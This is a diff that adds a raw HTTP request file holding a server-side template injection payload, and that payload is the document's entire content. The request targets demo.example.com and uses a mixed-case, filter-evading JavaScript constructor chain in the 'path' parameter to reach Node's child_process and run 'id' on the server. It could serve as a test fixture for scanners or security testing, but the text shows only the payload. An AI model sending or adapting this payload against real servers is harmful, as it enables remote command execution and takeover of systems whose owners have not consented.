@@ -1,0 +1,4 @@
+GET /a?path={{''.cOnStRuCtOr.CoNsTrUcToR('rEtUrN%20pRoCeSs')().MaInMoDuLe.ReQuIrE('cHiLd_PrOcEsS').eXeCsYnC('iD')}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
